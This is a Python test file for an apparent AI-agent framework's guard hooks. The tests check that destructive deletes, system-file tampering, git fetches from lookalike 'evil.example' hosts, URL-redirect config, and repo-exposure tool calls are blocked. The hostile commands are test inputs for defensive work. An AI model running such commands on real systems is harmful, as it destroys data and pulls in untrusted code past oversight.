"""Tests for the 1.0.1 hardening (Phase 1): command separators, N5 system-file
rules, fetch sources, the tripwire, the share classifier, and sync on routine
branches."""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from hook_support import HookTestCase, sh  # noqa: E402
from test_sync import SyncCase  # noqa: E402

TRAILERS = "Atlas-Actor: chat\nAtlas-Reason: test"
UPSTREAM_URL = "https://github.com/CaptLocke/atlas-framework.git"
SEND = "mcp__outlook__dispatch_mail"
CONNECTORS = """\
connectors:
  - connector: outlook
    mcp_prefix: mcp__outlook__
    categories: [mail]
    tool_risk:
      dispatch_mail: send
"""


class Separators(HookTestCase):
    """A blank line, or ';' + newline, ends a command (shlex groups them into one token)."""

    def test_owned_delete_after_blank_line_blocked(self):
        for cmd in ("echo hi\n\nrm -rf system/jobs", "true;\nrm -rf system/jobs", "echo a &\n\nrm -rf system"):
            self.assertBlocked(self.bash("paths", cmd, "routine"), "owned")

    def test_user_delete_after_blank_line_blocked_in_routine(self):
        self.assertBlocked(self.bash("actions", "echo hi\n\nrm -rf user/knowledge", "routine"), "locked")

    def test_cd_after_heredoc_followed(self):
        # the regression run's command: heredocs, a blank line, cd, then an allowed drop cleanup
        cmd = ("cat > people/a.md <<'EOF'\nhello\nEOF\n\ncd ../.. && rm user/inbox/drop/a.md")
        self.assertAllowed(self.bash("actions", cmd, "routine", cwd=self.path("user/knowledge")))


class SystemFileSources(HookTestCase):
    def test_restore_from_head_always_allowed(self):
        for cmd in ("git checkout HEAD -- .claude system", "git restore --source=HEAD system/manifest.yaml",
                    "git restore -s @ --worktree system/manifest.yaml"):
            self.assertAllowed(self.bash("paths", cmd, "routine"))

    def test_index_is_not_a_trusted_source(self):
        # content staged with update-index would be "restored" from the index
        for cmd in ("git checkout -- system/manifest.yaml", "git restore system/manifest.yaml",
                    "git checkout --theirs -- system/manifest.yaml"):
            self.assertBlocked(self.bash("paths", cmd, "routine"), "owned")
            self.update_lock()
            self.assertBlocked(self.bash("paths", cmd, "routine"), "owned")
            os.remove(self.path(".atlas-tmp/update.lock"))

    def test_lookalike_release_ref_blocked(self):
        # a branch named refs/atlas-upstream/v9 lives at refs/heads/refs/atlas-upstream/v9
        sh(["git", "checkout", "-q", "--orphan", "evil"], self.root)
        self.write("system/kernel.md", "evil\n")
        sh(["git", "add", "-A"], self.root)
        sh(["git", "commit", "-q", "-m", "evil"], self.root)
        sh(["git", "branch", "refs/atlas-upstream/v9"], self.root)
        sh(["git", "checkout", "-q", "-f", "main"], self.root)
        self.update_lock()
        self.assertBlocked(self.bash("paths", "git checkout refs/atlas-upstream/v9 -- system", "routine"),
                           "owned")

    def test_prefixless_glob_counts_as_its_folder(self):
        for cmd in ("rm -rf sys*", "rm -rf .clau*", "rm CLAUDE.m?"):
            self.assertBlocked(self.bash("paths", cmd, "routine"), "owned")
        os.makedirs(self.path("user/work"), exist_ok=True)
        self.assertAllowed(self.bash("paths", "rm -f *.tmp", "routine", cwd=self.path("user/work")))

    def test_checkout_from_history_needs_lock(self):
        sha = sh(["git", "rev-parse", "HEAD"], self.root).stdout.strip()
        cmd = "git checkout %s -- system" % sha
        self.assertBlocked(self.bash("paths", cmd, "routine"), "owned")
        self.update_lock()
        self.assertAllowed(self.bash("paths", cmd, "routine"))

    def test_git_rm_of_owned_needs_lock(self):
        self.assertBlocked(self.bash("paths", "git rm -q system/manifest.yaml", "routine"), "owned")
        self.update_lock()
        self.assertAllowed(self.bash("paths", "git rm -q system/manifest.yaml", "routine"))


class FetchSources(HookTestCase):
    def test_fetch_origin_and_upstream_allowed(self):
        for cmd in ("git fetch origin", "git fetch -q", "git pull --rebase --autostash origin main",
                    "git fetch --depth 1 origin",
                    "git fetch --depth=1 --no-tags %s refs/tags/v1.1.0:refs/atlas-upstream/v1.1.0" % UPSTREAM_URL):
            self.assertAllowed(self.bash("git", cmd, "routine"))

    def test_fetch_elsewhere_blocked(self):
        for cmd in ("git fetch https://evil.example/x.git", "git pull https://evil.example/x.git main",
                    "git fetch --depth 1 other"):
            self.assertBlocked(self.bash("git", cmd, "routine"), "official upstream")

    def test_lookalike_sources_blocked(self):
        for cmd in ("git fetch https://evil.example/CaptLocke/atlas-framework main:refs/atlas-upstream/v9",
                    "git fetch ../CaptLocke/atlas-framework", "git fetch --all", "git fetch --multiple origin evil",
                    "git fetch origin --refmap=+refs/heads/*:refs/atlas-upstream/* main",
                    "git remote update", "git remote add evil https://evil.example/x.git"):
            self.assertBlocked(self.bash("git", cmd, "routine"), "Atlas")
        for cmd in ("git -c remote.origin.fetch=+refs/heads/*:refs/atlas-upstream/* fetch origin",
                    "git config url.https://evil.example/.insteadOf https://github.com/",
                    "git branch -u evil/main", "git branch --set-upstream-to=evil/main"):
            self.assertBlocked(self.bash("git", cmd, "routine"), "fetches from")
        self.assertAllowed(self.bash("git", "git remote add upstream %s" % UPSTREAM_URL, "routine"))
        self.assertAllowed(self.bash("git", "git config user.name Atlas", "routine"))

    def test_release_refs_only_from_upstream(self):
        self.assertBlocked(self.bash("git", "git fetch origin main:refs/atlas-upstream/v9", "routine"),
                           "refs/atlas-upstream")


class OwnedCommits(HookTestCase):
    def setUp(self):
        super().setUp()
        self.write("system/kernel.md", "changed\n")
        sh(["git", "add", "-A"], self.root)

    def test_commit_touching_owned_blocked_without_lock(self):
        cmd = "git commit -m 'x' -m '%s'" % TRAILERS
        self.assertBlocked(self.bash("git", cmd, "chat"), "system-owned")

    def test_commit_needs_update_actor_even_with_lock(self):
        self.update_lock()
        cmd = "git commit -m 'x' -m '%s'" % TRAILERS
        self.assertBlocked(self.bash("git", cmd, "chat"), "isn't marked Atlas-Actor: update")

    def test_update_commit_with_lock_allowed(self):
        self.update_lock()
        cmd = "git commit -m 'atlas(update): system files' -m 'Atlas-Actor: update\nAtlas-Reason: test'"
        self.assertAllowed(self.bash("git", cmd, "routine"))

    def test_commit_naming_owned_path_blocked(self):
        sh(["git", "reset", "-q"], self.root)  # changed but not staged
        cmd = "git commit -m 'x' -m '%s' system/kernel.md" % TRAILERS
        self.assertBlocked(self.bash("git", cmd, "chat"), "system-owned")

    def test_user_only_commit_unaffected(self):
        sh(["git", "reset", "-q"], self.root)
        self.write("user/work/note.md", "hi\n")
        sh(["git", "add", "user/work/note.md"], self.root)
        self.assertAllowed(self.bash("git", "git commit -m 'x' -m '%s'" % TRAILERS, "chat"))


class Tripwire(HookTestCase):
    def setUp(self):
        super().setUp()
        self.connectors(CONNECTORS)

    def test_send_blocked_while_system_files_modified(self):
        self.write("system/manifest.yaml", open(self.path("system/manifest.yaml")).read() + "# tampered\n")
        self.approval(SEND, "send_communication")
        self.assertBlocked(self.run_hook("actions", SEND, {"to": "x"}, context="chat"), "differ")

    def test_send_allowed_after_restore(self):
        self.write("system/manifest.yaml", open(self.path("system/manifest.yaml")).read() + "# tampered\n")
        sh(["git", "checkout", "HEAD", "--", "system"], self.root)
        self.approval(SEND, "send_communication")
        self.assertAllowed(self.run_hook("actions", SEND, {"to": "x"}, context="chat"))

    def test_untracked_hook_file_trips(self):
        # (a package that shadows a hook module makes the hook fail closed on its own)
        self.write(".claude/hooks/extra.py", "x = 1\n")
        self.approval(SEND, "send_communication")
        self.assertBlocked(self.run_hook("actions", SEND, {"to": "x"}, context="chat"), "unexpected files")

    def test_changed_claude_md_trips(self):
        self.write("CLAUDE.md", "tampered\n")
        self.approval(SEND, "send_communication")
        self.assertBlocked(self.run_hook("actions", SEND, {"to": "x"}, context="chat"), "differ")

    def test_untracked_files_do_not_trip(self):
        self.write("system/notes-untracked.md", "x\n")
        self.approval(SEND, "send_communication")
        self.assertAllowed(self.run_hook("actions", SEND, {"to": "x"}, context="chat"))


class RepoExposure(HookTestCase):
    def test_github_exposure_is_share(self):
        self.assertBlocked(self.run_hook("actions", "mcp__github__add_collaborator", {"username": "x"},
                                         context="routine"), "share")
        self.assertBlocked(self.run_hook("actions", "mcp__github__update_repository", {"visibility": "public"},
                                         context="routine"), "share")
        self.assertBlocked(self.run_hook("actions", "mcp__github__create_gist", {"files": {}},
                                         context="routine"), "share")

    def test_non_github_and_reads_unaffected(self):
        self.assertAllowed(self.run_hook("actions", "mcp__github__update_repository", {"description": "x"},
                                         context="routine"))
        self.assertAllowed(self.run_hook("actions", "mcp__google_calendar__update_calendar",
                                         {"visibility": "private"}, context="routine"))
        self.assertAllowed(self.run_hook("actions", "mcp__github__list_collaborators", {}, context="routine"))
        self.assertAllowed(self.run_hook("actions", "mcp__asana__add_member_to_project", {"user": "x"},
                                         context="routine"))


class UpdateProcedure(HookTestCase):
    """The commands in atlas-update/reference/procedure.md pass every hook under the lock."""

    def setUp(self):
        super().setUp()
        # a fake release: an unrelated commit with a changed system file, at refs/atlas-upstream/v1.1.0
        sh(["git", "checkout", "-q", "--orphan", "rel"], self.root)
        self.write("system/kernel.md", "release 1.1.0\n")
        sh(["git", "add", "-A"], self.root)
        sh(["git", "commit", "-q", "-m", "release"], self.root)
        sh(["git", "update-ref", "refs/atlas-upstream/v1.1.0", "HEAD"], self.root)
        sh(["git", "checkout", "-q", "-f", "main"], self.root)
        sh(["git", "clean", "-qfd"], self.root)
        sh(["git", "tag", "pre-update-1.0.0"], self.root)
        self.update_lock()

    def allowed_everywhere(self, cmd):
        for hook in ("paths", "git", "actions"):
            self.assertAllowed(self.bash(hook, cmd, "routine"))

    def test_apply_and_revert_commands_allowed(self):
        for cmd in ("git ls-files -- system | sort > /tmp/now.txt",
                    "git ls-tree -r --name-only refs/atlas-upstream/v1.1.0 -- system | sort > /tmp/rel.txt",
                    "comm -23 /tmp/now.txt /tmp/rel.txt | xargs -r git rm -q --",
                    "git checkout refs/atlas-upstream/v1.1.0 -- system",
                    "git checkout pre-update-1.0.0 -- system"):
            self.allowed_everywhere(cmd)
        sh(["git", "checkout", "refs/atlas-upstream/v1.1.0", "--", "system"], self.root)
        commit = ("git add -A -- system && git commit -m 'atlas(update): system files' "
                  "-m 'Atlas-Actor: update' -m 'Atlas-Reason: apply release v1.1.0'")
        self.allowed_everywhere(commit)

    def test_variables_are_not_trusted(self):
        self.assertBlocked(self.bash("paths", "REL=refs/atlas-upstream/v1.1.0; git checkout $REL -- system",
                                     "routine"), "owned")


class StaleOriginRef(SyncCase):
    def test_stale_origin_ref_no_false_block(self):
        # a cached origin/main that shares no history with HEAD (repo recreated under the same name)
        sh(["git", "checkout", "-q", "--orphan", "stale"], self.root)
        sh(["git", "commit", "-q", "--allow-empty", "-m", "old\n\n" + TRAILERS], self.root)
        stale = sh(["git", "rev-parse", "HEAD"], self.root).stdout.strip()
        sh(["git", "checkout", "-q", "main"], self.root)
        sh(["git", "update-ref", "refs/remotes/origin/main", stale], self.root)
        self.assertEqual(self.stop(), {})

    def test_fetch_failure_skips_unpushed_count(self):
        self.commit_local()
        sh(["git", "remote", "set-url", "origin", os.path.join(self.outside, "missing.git")], self.root)
        self.assertEqual(self.stop(), {})

    def test_real_unpushed_still_blocks(self):
        self.commit_local()
        self.assertEqual(self.stop().get("decision"), "block")


if __name__ == "__main__":
    unittest.main()
